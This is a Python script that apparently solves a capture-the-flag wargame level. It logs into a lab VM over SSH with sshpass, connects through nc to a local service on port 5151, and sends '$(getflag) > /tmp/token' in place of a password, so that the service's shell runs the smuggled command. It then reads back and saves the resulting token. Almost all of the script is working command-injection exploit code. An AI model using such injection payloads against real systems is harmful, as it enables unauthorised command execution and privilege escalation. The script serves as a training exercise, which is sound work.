import os
import subprocess
import sys

sys.path.append("../..")

from utils.ssh import connect_by_previous, exec, get_current_level, get_previous_password, sanitize_token, save_token, \
    VM_ADDRESS, VM_PORT
from utils.text import print_title, print_output, print_action

client = connect_by_previous()

file = exec(client, 'ls', title='Get files list')[0]
print_output(file)

file_content = exec(client, f'cat {file}', title='Read file')
print_output(file_content)
print_title("Script wait connection on 127.0.0.0:5151")
print_title("Password calculated by echo with sha1sum, inject out script into it")

dev_null = open(os.devnull, 'w')
connect_command = f'sshpass -p {get_previous_password()} ssh {get_current_level()}@{VM_ADDRESS} -p {VM_PORT}'

command = f"{connect_command} nc 127.0.0.1 5151"
stream = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=dev_null)
print_action(command)

print_title('Send injection in stdin instead password')
command = b'$(getflag) > /tmp/token\n'
print_action(command.decode('utf-8').strip())
stream.stdin.write(command)
output = stream.communicate()[0].decode('utf-8')
print_output(output, 'Output')
print_title("It's okay, password doesn't match, but we just inject that script")

token_raw = exec(client, 'cat /tmp/token', title='Check results our tricky move')[0]
print_output(token_raw)
print_title("It our biggest win!")

token = sanitize_token(token_raw)
save_token(token)

client.close()


